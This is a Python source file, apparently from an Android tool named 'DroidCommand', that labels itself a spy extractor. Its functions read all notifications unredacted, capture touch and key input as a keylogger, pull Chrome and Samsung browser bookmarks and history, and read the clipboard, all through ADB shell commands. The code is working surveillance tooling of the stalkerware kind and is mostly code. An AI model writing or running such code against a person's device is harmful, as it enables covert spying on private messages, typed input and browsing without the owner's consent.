"""
DroidCommand — Spy Extractor Module
Modules 5-8: Notifications, Keylogger/Touch Events, Browser History, Clipboard
"""

import subprocess
import time
import re
import os
import logging  # fix: module logger for except-site diagnostics (item 4)
from pathlib import Path
from adb_engine import ADBEngine

adb = ADBEngine()

log = logging.getLogger(__name__)  # fix: item 4


def _decode_out(data):
    """TimeoutExpired.stdout can be bytes — normalize to str for parsing."""
    if isinstance(data, bytes):
        return data.decode("utf-8", errors="replace")
    return data or ""


# ==================== MODULE 5: NOTIFICATION INTERCEPTOR ====================

def get_notifications():
    """Read all active notifications from the device."""
    try:
        res = adb.shell("dumpsys notification --noredact", timeout=15)
        if not res["success"]:
            return {"success": False, "error": "Impossible de lire les notifications"}

        raw = res["stdout"]
        truncated = False
        if raw and len(raw) > 2_000_000:   # cap before regex sweeps over it
            raw = raw[:2_000_000]
            truncated = True
        notifications = []

        # Split by NotificationRecord blocks
        blocks = re.split(r'NotificationRecord\(', raw)

        for block in blocks[1:]:  # Skip first empty split
            notif = {}

            # Extract package
            pkg_match = re.search(r'pkg=(\S+)', block)
            if pkg_match:
                notif["pkg"] = pkg_match.group(1)

            # Extract key
            key_match = re.match(r'(0x[\da-f]+:\s*)?(\S+)', block)
            if key_match:
                notif["key"] = key_match.group(0)[:80]

            # Extract title from android.title
            title_match = re.search(r'android\.title=(?:String\s*\()?(.*?)(?:\)|$)', block, re.MULTILINE)
            if title_match:
                notif["title"] = title_match.group(1).strip()[:200]

            # Extract text from android.text
            text_match = re.search(r'android\.text=(?:String\s*\()?(.*?)(?:\)|$)', block, re.MULTILINE)
            if text_match:
                notif["text"] = text_match.group(1).strip()[:500]

            # Extract timestamp
            time_match = re.search(r'postTime=(\d+)', block)
            if time_match:
                ts_ms = int(time_match.group(1))
                notif["timestamp"] = ts_ms
                # epoch bounds (0 < t < 2100) — junk postTime only skips this
                # record's clock line, not the record itself
                if 0 < ts_ms < 4102444800000:
                    notif["time_str"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ts_ms / 1000))

            # Extract flags
            flags_match = re.search(r'flags=0x([0-9a-fA-F]+)', block)
            if flags_match:
                notif["flags"] = flags_match.group(1)

            # Only add if we have at least pkg and some content
            if notif.get("pkg") and (notif.get("title") or notif.get("text")):
                notifications.append(notif)

        # Deduplicate by pkg+title
        seen = set()
        unique = []
        for n in notifications:
            key = f"{n.get('pkg', '')}|{n.get('title', '')}|{n.get('text', '')}"
            if key not in seen:
                seen.add(key)
                unique.append(n)

        return {"success": True, "notifications": unique[:50], "count": len(unique),
                "truncated": truncated}

    except Exception as e:
        # fix: bare pass → log full traceback (item 4)
        log.exception("get_notifications failed: %s", e)
        return {"success": False, "error": "Erreur lors de la lecture des notifications"}


# ==================== MODULE 6: KEYLOGGER / TOUCH EVENT CAPTURE ====================

def capture_events(duration=5, serial=None):
    """Capture input events (touch/key) from the device for a given duration."""
    try:
        duration = min(max(int(duration), 2), 30)  # Clamp 2-30s

        # getevent -lt gives labeled timestamps + event names
        try:
            # fix: optional serial targeting for multi-device hosts (item 1)
            argv = [adb.adb_path]
            if serial:
                argv += ["-s", serial]
            argv += ["shell", "getevent", "-lt"]
            res = subprocess.run(
                argv,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=duration
            )
            output = res.stdout if res.stdout else ""
        except subprocess.TimeoutExpired as e:
            output = _decode_out(e.stdout)

        lines = output.splitlines()

        events = []
        for line in lines:
            line = line.strip()
            if not line:
                continue

            # Parse format: [timestamp] /dev/input/eventX: TYPE CODE VALUE
            match = re.match(
                r'\[\s*([\d.]+)\]\s*(/dev/input/event\d+):\s*(\w+)\s+(\w+)\s+(\w+)',
                line
            )
            if match:
                events.append({
                    "timestamp": float(match.group(1)),
                    "device": match.group(2),
                    "type": match.group(3),
                    "code": match.group(4),
                    "value": match.group(5),
                    "raw": line[:120]
                })

        # Filter for interesting events (key presses, touches, not sync)
        filtered = [e for e in events if e["type"] not in ("EV_SYN",)]

        return {
            "success": True,
            "events": filtered[:500],
            "total_raw": len(events),
            "total_filtered": len(filtered),
            "duration": duration
        }

    except Exception as e:
        # fix: bare pass → log full traceback (item 4)
        log.exception("capture_events failed: %s", e)
        return {"success": False, "error": "Erreur lors de la capture des événements"}


def stream_events_raw(duration=5, serial=None):
    """Get raw getevent output as string for SSE streaming."""
    try:
        duration = min(max(int(duration), 2), 30)
        try:
            # fix: optional serial targeting for multi-device hosts (item 1)
            argv = [adb.adb_path]
            if serial:
                argv += ["-s", serial]
            argv += ["shell", "getevent", "-lt"]
            res = subprocess.run(
                argv,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=duration
            )
            output = res.stdout if res.stdout else ""
        except subprocess.TimeoutExpired as e:
            output = _decode_out(e.stdout)
        return {"success": True, "output": output[:10000]}
    except Exception as e:
        # fix: bare pass → log full traceback (item 4)
        log.exception("stream_events_raw failed: %s", e)
        return {"success": False, "error": "Erreur lors du flux d'événements"}


# ==================== MODULE 7: BROWSER HISTORY ====================

def get_browser_history():
    """Extract browser history/bookmarks from Chrome or Samsung Browser."""
    try:
        results = {
            "success": True,
            "history": [],
            "bookmarks": [],
            "source": None,
            "errors": []
        }

        # Method 1: Try content provider for bookmarks (no root needed on older Android)
        bm_res = adb.shell(
            'content query --uri content://browser/bookmarks --projection url:title:visits:date',
            timeout=10
        )
        if bm_res["success"] and bm_res["stdout"] and "No result" not in bm_res["stdout"]:
            results["source"] = "content_provider"
            for line in bm_res["stdout"].splitlines():
                entry = {}
                url_match = re.search(r'url=(.*?)(?:,\s|\s*$)', line)
                title_match = re.search(r'title=(.*?)(?:,\s|\s*$)', line)
                visits_match = re.search(r'visits=(\d+)', line)
                date_match = re.search(r'date=(\d+)', line)

                if url_match:
                    entry["url"] = url_match.group(1).strip()
                if title_match:
                    entry["title"] = title_match.group(1).strip()
                if visits_match:
                    entry["visits"] = int(visits_match.group(1))
                if date_match:
                    ts = int(date_match.group(1))
                    if ts > 1000000000000:
                        ts = ts // 1000
                    # epoch bounds (0 < t < 2100) — junk date only skips this
                    # entry's clock line, not the entry itself
                    if 0 < ts < 4102444800:
                        entry["date"] = time.strftime("%Y-%m-%d %H:%M", time.localtime(ts))

                if entry.get("url"):
                    results["history"].append(entry)

        # Method 2: Try Chrome via run-as (needs debuggable or root)
        if not results["history"]:
            # fix: no `| head -200` — truncating the JSON mid-structure broke
            # json.loads every time; full file is fetched, entries capped in _extract_bm (item 2)
            chrome_res = adb.shell(
                'run-as com.android.chrome cat app_chrome/Default/Bookmarks 2>/dev/null',
                timeout=8
            )
            if chrome_res["success"] and chrome_res["stdout"] and len(chrome_res["stdout"]) > 10:
                results["source"] = "chrome_bookmarks_json"
                # Parse JSON bookmarks
                try:
                    import json
                    bm_data = json.loads(chrome_res["stdout"])
                    def _extract_bm(node, depth=0):
                        # depth + total caps keep hostile JSON bounded
                        if depth > 20 or len(results["bookmarks"]) >= 2000:
                            return
                        if isinstance(node, dict):
                            if node.get("type") == "url":
                                results["bookmarks"].append({
                                    "url": node.get("url", ""),
                                    "title": node.get("name", ""),
                                    "date": node.get("date_added", "")
                                })
                            for v in node.values():
                                _extract_bm(v, depth + 1)
                        elif isinstance(node, list):
                            for item in node:
                                _extract_bm(item, depth + 1)
                    _extract_bm(bm_data)
                except Exception:
                    results["errors"].append("Chrome bookmarks trouvés mais parsing JSON échoué")

        # Method 3: Samsung Internet browser
        if not results["history"] and not results["bookmarks"]:
            sam_res = adb.shell(
                'content query --uri content://com.sec.android.app.sbrowser/bookmarks --projection url:title 2>/dev/null',
                timeout=8
            )
            if sam_res["success"] and sam_res["stdout"] and "No result" not in sam_res["stdout"]:
                results["source"] = "samsung_browser"
                for line in sam_res["stdout"].splitlines():
                    url_match = re.search(r'url=(.*?)(?:,\s|\s*$)', line)
                    title_match = re.search(r'title=(.*?)(?:,\s|\s*$)', line)
                    if url_match:
                        results["bookmarks"].append({
                            "url": url_match.group(1).strip(),
                            "title": title_match.group(1).strip() if title_match else ""
                        })

        if not results["history"] and not results["bookmarks"]:
            results["errors"].append("Aucun historique accessible (root ou run-as requis pour Chrome)")

        return results

    except Exception as e:
        # fix: bare pass → log full traceback (item 4)
        log.exception("get_browser_history failed: %s", e)
        return {"success": False, "error": "Erreur lors de l'extraction de l'historique"}


# ==================== MODULE 8: CLIPBOARD MONITOR ====================

def get_clipboard():
    """Read the current clipboard content."""
    try:
        # Method 1: service call clipboard
        res = adb.shell("service call clipboard 2 s16 com.android.shell")
        content = None

        if res["success"] and res["stdout"]:
            raw = res["stdout"]
            # Parse Parcel hex output
            # Format: Result: Parcel(
            #   0x00000000: 00000000 00000003 0068006f 006c0061 '........h.o.l.a.'
            # )
            # fix: capture anchored to 0x-prefixed parcel rows only (item 3) —
            # hex tokens after the colon, ASCII gutter excluded
            hex_chunks = []
            for row_m in re.finditer(r"^\s*0x[0-9a-fA-F]+:\s*(.+)$", raw, re.MULTILINE):
                hex_chunks.extend(re.findall(r"\b[0-9a-fA-F]{8}\b", row_m.group(1).split("'")[0]))

            if hex_chunks:
                all_hex = ""
                for chunk in hex_chunks:
                    all_hex += chunk

                # Skip first 8 bytes (status + length), decode rest as UTF-16LE
                try:
                    raw_bytes = bytes.fromhex(all_hex[16:])  # Skip status + string length
                    decoded = raw_bytes.decode("utf-16-le", errors="replace")
                    # Strip null terminators and control chars
                    decoded = decoded.replace("\x00", "").strip()
                    if decoded and len(decoded) > 0:
                        content = decoded
                except (ValueError, UnicodeDecodeError):
                    pass

        # Method 2 fallback: dumpsys clipboard
        if content is None:
            dump_res = adb.shell("dumpsys clipboard")
            if dump_res["success"] and dump_res["stdout"]:
                # Look for primary clip text
                text_match = re.search(r'mPrimaryClip=ClipData.*?{.*?T:(.*?)}', dump_res["stdout"], re.DOTALL)
                if text_match:
                    content = text_match.group(1).strip()[:1000]

                if not content:
                    text_match2 = re.search(r'mText=(.*?)(?:\n|$)', dump_res["stdout"])
                    if text_match2:
                        content = text_match2.group(1).strip()[:1000]

        if content:
            return {"success": True, "content": content, "length": len(content)}
        else:
            return {"success": True, "content": "", "length": 0, "note": "Presse-papier vide"}

    except Exception as e:
        # fix: bare pass → log full traceback (item 4)
        log.exception("get_clipboard failed: %s", e)
        return {"success": False, "error": "Erreur lors de la lecture du presse-papier"}
